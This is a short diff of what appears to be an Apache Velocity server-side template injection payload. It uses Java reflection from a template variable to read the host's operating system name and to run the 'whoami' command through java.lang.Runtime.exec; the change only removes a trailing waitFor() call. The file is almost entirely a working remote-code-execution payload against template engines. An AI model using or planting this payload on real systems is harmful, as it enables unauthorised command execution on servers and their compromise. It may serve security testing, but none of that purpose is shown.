@@ -1,6 +1,6 @@
 #set($e="e")
 $e.getClass().forName('java.lang.System').getMethod('getProperty', $e.getClass().forName('java.lang.String')).invoke(null, 'os.name').toString()
-$e.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('whoami').waitFor()
+$e.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('whoami')
 <html>
 <body>
 e
